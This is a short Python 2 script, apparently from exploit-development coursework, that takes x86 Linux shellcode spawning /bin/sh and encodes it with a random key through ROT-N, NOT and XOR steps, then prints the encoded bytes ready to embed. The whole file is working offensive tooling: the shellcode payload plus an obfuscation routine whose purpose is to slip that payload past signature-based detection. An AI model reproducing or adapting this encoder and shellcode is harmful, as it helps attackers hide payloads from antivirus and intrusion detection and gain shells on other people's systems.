#!/usr/bin/python

import random

# shellcode for /bin/sh
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

med = random.randint(1, 255)
encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# 1st encoding - ROT-N
	y = (x + med) % 256
	# 2nd encoding - NOT
	y = ~y
	# 3rd encoding - XOR
	y = y ^ med

	encoded += '\\x'
	encoded += '%02x' % (y & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x,' % (y & 0xff)


print "\\x" + "%02x" % med + encoded
print "{0:#0{1}x}".format(med,4) + "," + encoded2

print 'Length of shellcode: %d' % len(bytearray(shellcode))
